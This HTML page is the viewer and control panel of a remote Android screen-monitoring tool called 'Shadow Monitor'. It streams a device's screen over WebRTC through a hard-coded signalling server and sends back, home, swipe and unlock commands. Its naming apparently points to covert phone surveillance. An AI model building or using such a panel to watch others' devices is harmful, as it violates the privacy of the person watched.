<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Shadow Monitor (Final Stable)</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>

    <style>
        :root { --bg: #050505; --glass: rgba(20, 25, 35, 0.9); --cyan: #00f3ff; --red: #ff2a6d; }
        body { margin: 0; background: var(--bg); color: #e0e6ed; font-family: 'Rajdhani', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        
        .top-bar { height: 50px; background: rgba(0,0,0,0.8); border-bottom: 1px solid #333; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; z-index: 10; }
        .brand { color: var(--cyan); font-weight: bold; font-size: 1.2rem; }
        .status { font-size: 0.9rem; color: #888; }
        .status.live { color: #00ff88; font-weight: bold; }

        .main-area { flex: 1; position: relative; display: flex; justify-content: center; align-items: center; background: black; }
        video { width: 100%; height: 100%; object-fit: contain; }
        
        .overlay { position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 5; }
        .input-group { display: flex; gap: 10px; margin-top: 20px; }
        input { padding: 10px; border-radius: 5px; border: 1px solid #444; background: #222; color: white; text-align: center; }
        button.start-btn { padding: 10px 20px; background: var(--cyan); border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
        
        .sidebar { height: 220px; background: var(--glass); border-top: 1px solid #333; padding: 10px; display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; z-index: 10; overflow-y: auto; }
        .btn { background: rgba(255,255,255,0.05); border: 1px solid #333; color: #ccc; border-radius: 5px; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 10px; }
        .btn:active { background: var(--cyan); color: black; }
        .btn i { margin-bottom: 5px; font-size: 1.2rem; }
    </style>
</head>
<body>

    <div class="top-bar">
        <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW v5</div>
        <div class="status" id="statusText">Disconnected</div>
    </div>

    <div class="main-area">
        <div class="overlay" id="connectOverlay">
            <h2 style="color: var(--cyan);">SECURE CONNECTION</h2>
            <div class="input-group">
                <input type="text" id="deviceId" placeholder="Device ID" value="945428">
                <button class="start-btn" onclick="startViewing()">CONNECT NOW</button>
            </div>
            <p style="color: #666; font-size: 12px; margin-top: 10px;">Ensure App is Open & "Start" is clicked</p>
        </div>

        <video id="remoteVideo" autoplay playsinline muted controls></video>
    </div>

    <div class="sidebar">
        <button class="btn" onclick="sendCmd('back')"><i class="fa-solid fa-chevron-left"></i> BACK</button>
        <button class="btn" onclick="sendCmd('home')"><i class="fa-regular fa-circle"></i> HOME</button>
        <button class="btn" onclick="sendCmd('recent')"><i class="fa-regular fa-square"></i> APPS</button>
        
        <button class="btn" onclick="sendCmd('swipe_up')"><i class="fa-solid fa-arrow-up"></i> UP</button>
        <button class="btn" onclick="sendCmd('swipe_down')"><i class="fa-solid fa-arrow-down"></i> DOWN</button>
        <button class="btn" onclick="sendCmd('unlock')"><i class="fa-solid fa-lock-open"></i> WAKE</button>
    </div>

    <script>
        // --- LOGIC FROM YOUR WORKING SIMPLE CODE ---
        const SOCKET_URL = "https://child-v9no.onrender.com"; 
        
        let socket;
        let peerConnection;
        const config = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };

        // UI Elements
        const statusEl = document.getElementById("statusText");
        const overlayEl = document.getElementById("connectOverlay");
        const videoEl = document.getElementById("remoteVideo");

        // URL se ID uthao agar hai
        const urlParams = new URLSearchParams(window.location.search);
        const urlId = urlParams.get('id');
        if(urlId) document.getElementById("deviceId").value = urlId;

        function startViewing() {
            const deviceId = document.getElementById("deviceId").value;
            if(!deviceId) return alert("Enter Device ID");

            statusEl.innerText = "Connecting to Server...";
            
            // 1. Socket Connect (Wahi Logic)
            if(socket) socket.disconnect(); // Purana clear karo
            socket = io(SOCKET_URL, { transports: ['websocket', 'polling'] });

            socket.on("connect", () => {
                console.log("âœ… Connected to Server");
                statusEl.innerText = "Waiting for Android...";
                socket.emit("join-room", deviceId);
                // Hide overlay immediately to show video is readying
                overlayEl.style.display = "none";
            });

            // 2. Wait for Offer (Updated Logic with fixes)
            socket.on("offer", async (data) => {
                console.log("ðŸ“¡ Offer Received!");
                statusEl.innerText = "Negotiating Stream...";
                statusEl.className = "status live";

                if (peerConnection) peerConnection.close();
                createPeerConnection(deviceId);

                try {
                    // --- YE HAI WO LINE JO CODE KO FIX KAREGI ---
                    // Android kabhi kabhi string bhejta hai, kabhi JSON. Ye dono handle karega.
                    let offerDesc = data.offer;
                    if (offerDesc.sdp) {
                         // Already object, do nothing specific
                    } else if (typeof offerDesc === 'string') {
                        offerDesc = JSON.parse(offerDesc);
                    }
                    
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(offerDesc));
                    const answer = await peerConnection.createAnswer();
                    await peerConnection.setLocalDescription(answer);

                    console.log("âš¡ Sending Answer");
                    socket.emit("answer", { target: deviceId, answer: answer });
                    
                } catch (err) {
                    console.error("Error handling offer:", err);
                    statusEl.innerText = "Handshake Error";
                }
            });

            // 3. Candidate Logic (With Nesting Fix)
            socket.on("candidate", async (data) => {
                if (peerConnection) {
                    try {
                        let candidateData = data.candidate;
                        // --- YE NESTING FIX HAI ---
                        if (candidateData && candidateData.candidate && typeof candidateData.candidate === 'object') {
                            candidateData = candidateData.candidate;
                        }
                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidateData));
                        console.log("â„ï¸ ICE Added");
                    } catch (e) { console.error("Error adding candidate", e); }
                }
            });

            socket.on("disconnect", () => {
                statusEl.innerText = "Disconnected";
                statusEl.className = "status";
                overlayEl.style.display = "flex"; // Show input again
            });
        }

        function createPeerConnection(targetId) {
            peerConnection = new RTCPeerConnection(config);

            peerConnection.ontrack = (event) => {
                console.log("ðŸŽ¥ Video Stream Received!");
                statusEl.innerText = "ðŸ”´ LIVE STREAMING";
                videoEl.srcObject = event.streams[0];
                videoEl.play().catch(e => console.log("Press play button"));
            };

            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit("candidate", { target: targetId, candidate: event.candidate });
                }
            };
        }

        // Button Controls
        function sendCmd(action) {
            const deviceId = document.getElementById("deviceId").value;
            if(socket && socket.connected) {
                socket.emit("control-event", { room: deviceId, action: action });
            } else {
                alert("Connect first!");
            }
        }
    </script>

</body>
</html>
